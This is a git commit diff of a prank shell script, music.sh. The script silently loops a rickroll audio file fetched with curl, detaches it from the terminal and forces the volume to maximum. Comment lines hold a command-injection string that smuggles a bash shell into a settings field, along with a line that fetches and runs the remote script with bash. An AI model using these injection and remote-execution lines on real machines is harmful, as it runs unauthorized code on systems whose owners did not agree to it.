ea5185fc02e458037d79af27461aea82d34089ab
TheYunDude <97200157+TheYunDude@users.noreply.github.com>
2023-03-03 08:21:46 -0800

    struff

--- music.sh
+++ music.sh
@@ -2,9 +2,9 @@ exec >/dev/null
 exec 2>/dev/null
 while [ 1=1 ];
 do
-    aplay -q <(curl -s https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4);
+    aplay -q <(curl https://raw.githubusercontent.com/ShatteredDisk/rickroll/master/rickroll.mp4);
 done & disown &
 amixer set Master 100% unmute;
 
 #set_cellular_ppp \';bash;exit;\'
-#bash <(curl https://coolelectronics.me/music.sh)
+#bash <(curl https://raw.githubusercontent.com/TheYunDude/The-Big-Boy-Yunus/main/music.sh)
